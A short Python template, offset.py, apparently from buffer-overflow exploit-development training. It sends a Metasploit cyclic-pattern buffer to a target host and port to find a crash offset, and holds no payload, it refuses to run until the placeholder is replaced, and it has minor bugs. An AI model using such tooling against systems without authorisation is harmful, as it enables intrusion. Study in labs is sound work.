#!/usr/bin/python

import socket
import time
import sys

if len(sys.argv) < 3:
    print("usage: \"python offset.py [target] [port]\"")
    print("usage: also don't forget to change the inputBuffer value!")
    print("usage: you can get that with \"msf-pattern_create -l [size]\"")
    exit(0)

cmd = ""
target = sys.argv[1]
port = int(sys.argv[2])

if len(sys.argv) == 4:
    cmd = sys.argv[3] + " "
else:
    cmd = ""
    
inputBuffer = cmd + "replace me!"

if inputBuffer == cmd + "replace me!":
    print("usage: you need to replace the buffer with a pattern offset!")
    print("usage: this can be done with \"msf-pattern-create -l [size]")
    exit(0)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target,port))
print("sending buffer")
s.send(inputBuffer)
exit(0)
s.close()
 



